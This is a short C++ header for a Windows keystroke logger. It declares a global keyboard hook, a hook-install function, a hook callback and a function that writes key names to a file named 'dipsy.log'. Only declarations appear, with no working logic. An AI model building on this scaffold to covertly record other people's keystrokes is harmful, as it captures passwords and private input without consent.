#ifndef WINKEY_HPP
# define WINKEY_HPP

# define WIN32_LEAN_AND_MEAN
# define __STDC_WANT_SECURE_LIB__ 1

#include <iostream>
#include <fstream>
#include <windows.h>

# define LOG_FILE "dipsy.log"

extern HHOOK g_hHook;
extern std::ofstream g_log_file;

int open_log_file();
void log(std::string key_name);

int install_keyboard_hook();

LRESULT CALLBACK keyboard_hook(
    _In_ int    nCode,
    _In_ WPARAM wParam,
    _In_ LPARAM lParam
);

//void windows_hook();

#endif